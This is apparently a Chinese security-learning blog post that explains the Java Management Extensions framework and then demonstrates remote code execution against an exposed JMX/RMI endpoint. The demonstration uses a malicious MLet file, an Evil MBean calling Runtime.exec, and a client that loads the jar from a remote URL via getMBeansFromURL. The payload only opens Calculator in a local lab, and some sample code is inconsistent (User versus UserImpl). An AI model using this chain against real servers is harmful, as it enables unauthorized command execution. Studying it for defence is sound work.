#### JMX简介

JMX是Java Management Extensions(Java管理扩展)的缩写，是一个为应用程序植入管理功能的框架。

#### JMX理解

这么打眼一看的话，不是太好理解，所以贴上如下这张图。

![](./img/1722088594149740153.png)  
在JMX中包含了如上这几个角色:

MBean，MBeanServer，Connector。后面会将这几个关键词一一介绍。

那么现在去尝试理解这张图:

首先当我们有两个虚拟机的时候，左边是第一个JVM，右边是第二个JVM，如果这两个JVM想通过JVM进行一个沟通的话，首先第一个JVM中有一个ManagedApplication表示这个程序是被管理的，在这里面有一个Mbean，Mbean表示的就是有一定的资源可以被管理，比如相关的一些方法，那么Mbean是注册在MbeanServer中的，那么MbeanServer为了将自己的服务向外提供，那么就在出口这块开启了一个Connector
Server，Connector Server会监听外部的请求。

那么现在来到我们第二个JVM当中，在这个JVM中的JMX Connector是一个Connector
Client，也就是客户端，那么现在就清楚了左边的是服务端，右边的是客户端。那么现在就通过Connector Client来连接到Connector
Server，然后通过MbeanServer找到Mbean这个资源，然后调用Mbean当中的一些方法。

那么总的来说第一个JVM作为一个被动者，而第二个JVM作为一个主动者，主动者去连接被动者获取资源。

说了这么多我们用代码来体会一下:

#### 代码实例

首先创建Mbean接口:

    
    
    public interface UserMBean {
        String getName();
        void setName(String name);
    
        int getAge();
        void setAge(int age);
    
        void study(String subject);
    }
    

然后创建他的实现类:
注意这里创建Mbean实现类的时候需要符号规范，就比如说你的接口是UserMBean，那么你的实现类就是User，不能是UserImpl或者其他类名。

    
    
    public class User implements UserMBean{
        private String name;
        private int age;
    
        public UserImpl(String name, int age) {
            this.name = name;
            this.age = age;
        }
    
        @Override
        public String getName() {
            return name;
        }
    
        @Override
        public void setName(String name) {
            this.name = name;
        }
    
        @Override
        public int getAge() {
            return age;
        }
    
        @Override
        public void setAge(int age) {
            this.age = age;
        }
    
        @Override
        public void study(String subject) {
            String message = String.format("%s (%d) is studying %s.", name, age, subject);
            System.out.println(message);
        }
    }
    

创建JXM服务端：

这里代码就是首先创建MBeanServer，让将MBean注册进MBeanServer中，然后创建Connector
Server，放出一个监听的地址，方便客户端通过这个地址进行连接，最后开启监听，等待客户端的连接。

    
    
    import javax.management.MBeanServer;
    import javax.management.MBeanServerFactory;
    import javax.management.ObjectName;
    import javax.management.remote.JMXConnectorServer;
    import javax.management.remote.JMXConnectorServerFactory;
    import javax.management.remote.JMXServiceURL;
    
    public class JMXServer {
        public static void main(String[] args) throws Exception{
            //创建MbeanSeerver
            MBeanServer beanServer = MBeanServerFactory.createMBeanServer();
    
            //将Mbean注册进去
            UserImpl bean = new UserImpl("job",20);
            ObjectName objectName = new ObjectName("com.relaysec.bean:type=user,name=UserImpl");
            beanServer.registerMBean(bean,objectName);
    
            //创建Connector Server
            JMXServiceURL serviceURL = new JMXServiceURL("rmi","127.0.0.1",9876);
            JMXConnectorServer connectorServer = 
                    JMXConnectorServerFactory.newJMXConnectorServer(serviceURL,null,beanServer);
            //开启监听
            connectorServer.start();
            JMXServiceURL connnectorServerAddress = connectorServer.getAddress();
            System.out.println(connnectorServerAddress);
    
            Thread.sleep(5000);
            connectorServer.stop();
        }
    }
    

运行Server端：可以看到这里会产生一个地址，这个地址就是客户端需要连接的地址。

![](./img/4629712585676477578.png)  
创建客户端:这里的connectorAddress地址就是服务端输出的那个地址。

    
    
    import javax.management.MBeanServerConnection;
    import javax.management.ObjectName;
    import javax.management.remote.JMXConnector;
    import javax.management.remote.JMXConnectorFactory;
    import javax.management.remote.JMXServiceURL;
    
    public class JMXClient {
        public static void main(String[] args) throws Exception{
            // 第一步，创建 Connector Client
            String connectorAddress = "service:jmx:rmi://127.0.0.1:9876/stub/rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LnJlbW90ZS5ybWkuUk1JU2VydmVySW1wbF9TdHViAAAAAAAAAAICAAB4cgAaamF2YS5ybWkuc2VydmVyLlJlbW90ZVN0dWLp/tzJi+FlGgIAAHhyABxqYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlT2JqZWN002G0kQxhMx4DAAB4cHc0AAtVbmljYXN0UmVmMgAACTEyNy4wLjAuMQAAJpQZYtuDeP/Pn7mEUoUAAAGJ3q2NmIABAHg=";
            JMXServiceURL address = new JMXServiceURL(connectorAddress);
            JMXConnector connector = JMXConnectorFactory.connect(address);
    
            // 第二步，获取 MBeanServerConnection 对象
            MBeanServerConnection beanServerConnection = connector.getMBeanServerConnection();
    
            // 第三步，向 MBean Server 发送请求
            ObjectName objectName = new ObjectName("com.relaysec.bean:type=user,name=UserImpl");
            String[] array = new String[]{"Chinese", "Math", "English"};
            for (String item : array) {
                beanServerConnection.invoke(objectName, "study", new Object[]{item}, new String[]{String.class.getName()});
            }
    
            // 第四步，关闭 Connector Client
            connector.close();
        }
    }
    

可以看到在客户端连接并调用方法之后，在服务端输出。可以看到已成功调用

![](./img/7338548002699085199.png)  
创建MbeanServer的另一种方式:

    
    
    MBeanServer platformMBeanServer = ManagementFactory.getPlatformMBeanServer();
    

这两种创建MbeanServer的区别就是如上这一种在jsconsole中是可以看到方法并且修改调用的，第一种方式是不行的。

我们修改成第二种方式，然后使用jconsol连接我们的JMXServer。

点击连接使用不安全连接。

![](./img/6072373478747167258.png)  
然后点击Mbean：这里我们可以将Tom值改成其他的点击刷新。

![](./img/8563531485127048026.png)  
然后点击操作中的study点击调用。

![](./img/6039856468749582829.png)  
可以发现成功调用:

![](./img/7466109157477092716.png)  
但是如果我们使用第一种方式创建MBeanServer，他是没有我们这个Mbean这个类的。

好了上面一个小实例相信你对JMX有了一些了解了，那么接下来就来看看具体的类中的结构都是怎么样的。

#### MBean

在了解MBean之前我们需要去了解Resource这个概念，Resource他所代表的就是资源，这里的资源可以分为很多种，可能是应用层面，比如说用户的数量，也可能在Class层面，比如说类中的某一个字段记录了某个方法调用的次数。

**JMX 的一个主要目标就是对 resource（资源）进行 management（管理）和
monitor（监控），它要把一个我们关心的事物（resource）给转换成 manageable resource。**

接下来我们来说MBean的概念，MBean 是 managed bean 的缩写，它就代表 manageable resource 本身，或者是对
manageable resource 的进一步封装， 它就是 manageable resource 在 JMX
架构当中所对应的一个“术语”或标准化之后的“概念”。

在JMX当中，MBean有不同的的类型。

  * Standard MBean
  * Dynamic MBean
  * Open MBean
  * Model MBean

这里我们只需要关注Standard MBean即可，这个Standard MBean在书写上有些规范。

1.类名层面，例如有一个User类，这个User类就是我们的资源，他必须实现一个接口，接口的名字必须是UserMBean，也就是说这两个是对应的，你需要在User后面加一个MBean，这就是接口的名字。

2.User类必须拥有一个空参构造器。

3.方法层面，getter方法不能接受参数，比如说int getAge()这样是可以的，但是int getAge(String
name)这样是不行的，而setter方法只能接收一个参数，我们可以想到他其实跟我们正常的JavaBean是差不多的。

#### MBeanServer

在MBean创建完成之后，需要将MBean注册到MBeanServer中，方便客户端去取。

MBeanServer是一个接口，需要通过MBeanServerFactory工厂类进行创建对象。

最终创建的对象是JmxMBeanServer。

可以通过如下两种方式进行创建:

    
    
    MBeanServer beanServer = MBeanServerFactory.createMBeanServer();
    MBeanServer beanServer = ManagementFactory.getPlatformMBeanServer();
    

那么这两种方式的不同之处在于第一种创建的MBeanServer，在使用jconsole连接的时候，他不会显示方法。但是使用第二种的话是可以显示方法并且调用的。所以推荐使用第二种方式创建MBeanServer。

最终创建的对象如下:

![](./img/6227340109465431104.png)

#### MBean对象注册到MBeanServer

注册MBean对象到MBeanServer中使用的是registerMBean这个方法，这个方法接收一个Object类型和一个ObjectName的一个类型，那么他的第一个参数就是MBean对象，第二个参数就是MBeanName值。这个ObjectName是需要指定唯一的。

    
    
    public ObjectInstance registerMBean(Object object, ObjectName name)
            throws InstanceAlreadyExistsException, MBeanRegistrationException,
                   NotCompliantMBeanException;
    

对应如下代码，这里的ObjectName对应的就是这个bean的唯一标识，他是一个key=>value的一个形式，前面的是一个包名相当于key，value就是type=user,name=UserImpl,当然你也可以起别的名字，也是没有任何问题的。

    
    
    User bean = new User("job",20);
    ObjectName objectName = new ObjectName("com.relaysec.bean:type=user,name=UserImpl");
    beanServer.registerMBean(bean,objectName);
    

这个名字是根据官方的注释来起的，如果你起的其他的也是没有任何问题的。

![](./img/4365007750220154469.png)

#### Connector

##### Connector Server

Connector Server和MBeanServer这两个是联系在一块的，Connector
Server可以建立并发的链接，他是多线程的，也就是说多个客户端可以连接同一个Connector Server。

客户端如果想和Connector Serve来建立连接，需要一个地址来建立连接。

创建一个JMXConnectorServer对象需要通过JMXConnectorServerFactory工厂来进行创建，这里需要三个值，第一个值需要传进去一个JMXServiceURL对象，这个对象中的值表示的是rmi协议，ip和端口，第三个参数是就是我们的MBeanServer。

    
    
    JMXServiceURL serviceURL = new JMXServiceURL("rmi","127.0.0.1",9876);
    JMXConnectorServer connectorServer =
            JMXConnectorServerFactory.newJMXConnectorServer(serviceURL,null,beanServer);
    

在创建完JMXConnectorServer对象之后，他是处于一个没有开启的一个状态的。

需要调用start方法对他进行开启监听，开启监听之后，客户端才可以通过地址进行连接。

    
    
    connectorServer.start();
    

在开启监听之后，我们就可以通过调用它的getAddress方法来获取到connector
server的服务地址，拿到这个地址之后客户端就可以通过这个地址进行连接。

    
    
    JMXServiceURL connnectorServerAddress = connectorServer.getAddress();
    

最后需要关闭监听使用stop方法。

    
    
    connectorServer.stop();
    

##### Connector Client

服务端已经在监听了，那么现在客户端可以通过服务端提供的地址来进行连接。

    
    
    String connectorAddress = "service:jmx:rmi://127.0.0.1:9876/stub/rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LnJlbW90ZS5ybWkuUk1JU2VydmVySW1wbF9TdHViAAAAAAAAAAICAAB4cgAaamF2YS5ybWkuc2VydmVyLlJlbW90ZVN0dWLp/tzJi+FlGgIAAHhyABxqYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlT2JqZWN002G0kQxhMx4DAAB4cHc0AAtVbmljYXN0UmVmMgAACTEyNy4wLjAuMQAAJpRxNJPhlOHTJo9l1lMAAAGJ3q9SGYABAHg=";
    JMXServiceURL address = new JMXServiceURL(connectorAddress);
    JMXConnector connector = JMXConnectorFactory.connect(address);
    

连接成功之后我们可以通过调用getMBeanServerConnection方法来获取一个MBeanServerConnection对象，然后我们就可以通过MBeanServerConnection对象来和MBeanServer进行交互了，拿到MBeanServer之后，因为Mbean就注册在MBeanServer中，所以我们可以去调用MBean的相关方法。

    
    
    MBeanServerConnection beanServerConnection = connector.getMBeanServerConnection();
    ObjectName objectName = new ObjectName("com.nanchensec.relaysec:type=aa");
    MBeanInfo mBeanInfo = beanServerConnection.getMBeanInfo(objectName);
    

![](./img/5462442786709271220.png)  
这里可以通过invoke方法调用，这里第一个参数就是MBean的唯一标识，第二个就是方法名，然后方法的参数值。

    
    
    beanServerConnection.invoke(objectName, "study", new Object[]{"aaa"}, new String[]{String.class.getName()});
    

![](./img/4614793738948130972.png)  
如上就是JXM相关的基础操作了。

#### JMX攻击

这里首先说一下除了上述可以通过服务器地址来连接Connector Server之外，也可以在Server端使用如下方式。

    
    
    LocateRegistry.createRegistry(7896);
    JMXServiceURL serviceURL = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:7896/jmxrmi");
    

那么客户端就可以通过service:jmx:rmi:///jndi/rmi://localhost:7896/jmxrmi来进行连接了。

    
    
    String connectorAddress = "service:jmx:rmi:///jndi/rmi://localhost:7896/jmxrmi";
    JMXServiceURL address = new JMXServiceURL(connectorAddress);
    JMXConnector connector = JMXConnectorFactory.connect(address);
    

那么我们在想如果他既然可以通过本地来加载MBean，那是不是也可以通过远程的方式的来加载MBean呢？

这就要说到MLet这个applet的快捷方式了。

它可以在来自远程URL的MBean服务器中注册一个或者多个MBean，简而言之他其实就是一个类似于HTML的文件。

    
    
    <html><mlet code="Evil" archive="compromise.jar" name="MLetCompromise:name=evil,id=1" codebase="http://127.0.0.1:4141"></mlet></html>
    

这里的MBeanServer只需要一点改变，将客户端连接方式改为如上的service:jmx:rmi:///jndi/rmi://localhost:7896/jmxrmi的这种方式即可。

那么现在就首先去创建一个恶意的MBean。

    
    
    public interface EvilMBean {
        public void Command(String cmd);
    }
    

创建他的实现类,这里只是简单的谈一个计算器。

    
    
    import java.io.*;
    
    public class Evil implements EvilMBean
    {
        public void Command(String cmd)
        {
            try {
                Runtime rt = Runtime.getRuntime();
                rt.exec("open -a Calculator");
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
        }
    }
    

然后将这两个打成Jar包，打成jar包的方式有很多种，我这里采用的是通过maven方式。然后点击package打包即可。

![](./img/780617829820851335.png)  
打包完成之后会生成一个Jar文件，我们将他的名字更改为compromise.jar，和mlet文件中的对应，然后将这两个文件放到同一目录。

![](./img/1010164068793749249.png)  
然后在这两个文件的目录下开启一个4141端口的web服务。

![](./img/2509313582671716447.png)  
创建恶意的客户端:

    
    
    import javax.management.MBeanServerConnection;
    import javax.management.ObjectInstance;
    import javax.management.ObjectName;
    import javax.management.remote.JMXConnector;
    import javax.management.remote.JMXConnectorFactory;
    import javax.management.remote.JMXServiceURL;
    import java.net.InetAddress;
    import java.util.HashSet;
    import java.util.Iterator;
    
    public class JMXEvai {
        public static void main(String[] args) throws Exception{
            //连接server服务
            String connectorAddress = "service:jmx:rmi:///jndi/rmi://localhost:7896/jmxrmi";
            JMXServiceURL address = new JMXServiceURL(connectorAddress);
            JMXConnector connector = JMXConnectorFactory.connect(address);
            System.out.println(connector.getConnectionId()); //获取连接id值为:rmi://127.0.0.1  2
    
            //获取MBeanServerConnection对象
            MBeanServerConnection beanServerConnection = connector.getMBeanServerConnection();
    
            ObjectInstance evil = null;
            ObjectInstance evil_bean = null;
            //通过MBeanServerConnection对象创建一个恶意的MBean
            try {
                evil = beanServerConnection.createMBean("javax.management.loading.MLet", null);
            } catch (javax.management.InstanceAlreadyExistsException e) {
                evil = beanServerConnection.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
            }
    
            //注册完成MBean之后，调用方法，第一个参数Bean的唯一标识，第二个参数方法名，第三个参数方法的参数,可以看到这里调用的是getMBeansFromURL的方法，
            //getMBeansFromURL方法中传入一个URL的参数。
            Object getMBeansFromURL = beanServerConnection.invoke(evil.getObjectName(), "getMBeansFromURL", new String[]{"http://127.0.0.1:4141/mlet"}, new String[]{String.class.getName()});
    //        System.out.println(InetAddress.getLocalHost().getHostAddress());
            HashSet res_set = ((HashSet)getMBeansFromURL);
    //        System.out.println(res_set);
            Iterator itr = res_set.iterator();
    //        System.out.println(itr);
            Object nextObject = itr.next();
    //        System.out.println(nextObject);
    
            evil_bean = ((ObjectInstance)nextObject);
            System.out.println("ClassName类名为:" + evil_bean.getClassName());
            //这里执行的就是Evil这个恶意类了，而我们的恶意类中只会弹出一个计算器。所以这里参数是不需要给的，我随便给了一个。
            beanServerConnection.invoke(evil_bean.getObjectName(),"Command",new Object[]{"123"}, new String[]{ String.class.getName() });
        }
    }
    

![](./img/1720695061258402193.png)  
其实我们可以发现他的一个漏洞点其实是在他第一次去执行getMBeansFromURL的时候。

首先使用createMBean创建Mlet这个类，然后通过使用getMBeansFromURL从远程的URL中加载mlet文件，最后解析mlet文件，如果存在codebase，那么就从远程加载jar文件，并且加入到MBean，调用MBean的方法，实现RCE。

如上就是JMX的相关学习。  
参考：  
<https://www.anquanke.com/post/id/202686?display=mobile>  
<https://www.cnblogs.com/0x28/p/15685164.html>

